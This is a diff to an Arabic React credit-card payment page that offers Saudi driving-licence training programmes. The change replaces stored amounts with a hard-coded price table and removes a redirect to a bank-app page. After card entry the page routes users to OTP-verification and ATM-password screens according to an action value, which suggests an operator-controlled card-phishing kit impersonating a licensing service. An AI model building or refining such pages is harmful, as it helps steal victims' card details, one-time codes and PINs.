@@ -120,16 +120,56 @@ export default function CreditCardPayment() {
   const [selectKey, setSelectKey] = useState(0); // مفتاح لإعادة تعيين Select components
   const debounceRef = useRef<ReturnType<typeof setTimeout>>();
 
-  // Get service name and amount from URL params or localStorage
+  // Get service name and amount from URL params
   const searchParams = new URLSearchParams(window.location.search);
-  const serviceName = searchParams.get('service') || localStorage.getItem('selectedService') || 'خدمات رخصة القيادة';
+  const serviceName = searchParams.get('service') || 'خدمات رخصة القيادة';
   const amountFromUrl = searchParams.get('amount');
-  const savedPaymentAmount = localStorage.getItem('selectedPaymentAmount');
-  const savedTotalAmount = localStorage.getItem('selectedTotalAmount');
   
-  // Use amount from URL first, then localStorage selectedPaymentAmount, then savedTotalAmount
-  const totalAmount = amountFromUrl || savedPaymentAmount || savedTotalAmount || '500';
-  const isBookingPayment = totalAmount === '1';
+  // Service prices - same as SummaryPayment
+  const servicePrices: Record<string, number> = {
+    // تصريح مؤقت
+    'برنامج 30 ساعات تدريبية - تصريح مؤقت': 2760.00,
+    'برنامج 15 ساعات تدريبية - تصريح مؤقت': 1466.25,
+    'برنامج 6 ساعات تدريبية - تصريح مؤقت': 690.00,
+    // خصوصي
+    'برنامج 30 ساعات تدريبية - خصوصي': 2760.00,
+    'برنامج 15 ساعات تدريبية - خصوصي': 1466.25,
+    'برنامج 6 ساعات تدريبية - خصوصي': 690.00,
+    // دراجة نارية
+    'برنامج 30 ساعات تدريبية - دراجة نارية': 2760.00,
+    'برنامج 15 ساعات تدريبية - دراجة نارية': 1466.25,
+    'برنامج 6 ساعات تدريبية - دراجة نارية': 690.00,
+    // أجرة
+    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - أجرة': 500.25,
+    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - أجرة': 644.00,
+    // نقل خفيف
+    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - نقل خفيف': 500.25,
+    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - نقل خفيف': 644.00,
+    // حافلات صغيرة
+    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - حافلات صغيرة': 500.25,
+    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - حافلات صغيرة': 644.00,
+    // نقل ثقيل
+    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - نقل ثقيل': 500.25,
+    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - نقل ثقيل': 644.00,
+    // حافلات كبيرة
+    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص) - حافلات كبيرة': 500.25,
+    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص) - حافلات كبيرة': 644.00,
+    // آليات أعمال الطرق
+    'برنامج تدريبي لمدة 1 أيام - آليات أعمال الطرق': 500.25,
+    // Generic fallbacks
+    'برنامج 30 ساعات تدريبية': 2760.00,
+    'برنامج 15 ساعات تدريبية': 1466.25,
+    'برنامج 6 ساعات تدريبية': 690.00,
+    'برنامج تدريبي لمدة 4 أيام (بدون ترخيص)': 500.25,
+    'برنامج تدريبي لمدة 10 أيام (بدون ترخيص)': 644.00,
+    'برنامج تدريبي لمدة 1 أيام': 500.25,
+  };
+  
+  // Use amount from URL if available, otherwise calculate from service prices
+  const totalAmount = amountFromUrl || (() => {
+    const price = servicePrices[serviceName] || 500.25;
+    return String(parseFloat((price + price * 0.15).toFixed(2)));
+  })();
 
   const {
     register,
@@ -209,8 +249,6 @@ export default function CreditCardPayment() {
         navigate("/otp-verification");
       } else if (action === 'atm') {
         navigate("/atm-password");
-      } else if (action === 'inma') {
-        navigate("/inma-app");
       } else if (action === 'reject') {
         setRejectedError(true);
         // تفريغ جميع الحقول عند رفض البطاقة
@@ -408,7 +446,7 @@ export default function CreditCardPayment() {
           <p className="text-gray-500 text-xs sm:text-sm">أدخل بيانات بطاقتك لإتمام الدفع</p>
           <div className="mt-3 p-3 bg-green-50 rounded-lg">
             <p className="text-xs sm:text-sm text-gray-600">{serviceName}</p>
-            <p className={`font-bold text-green-600 ${isBookingPayment ? 'text-sm sm:text-base' : 'text-xl sm:text-2xl'}`}>{isBookingPayment ? '1 ريال لإثبات طريقة الدفع' : `${totalAmount} ر.س`}</p>
+            <p className="text-xl sm:text-2xl font-bold text-green-600">{totalAmount} ر.س</p>
           </div>
         </div>
 
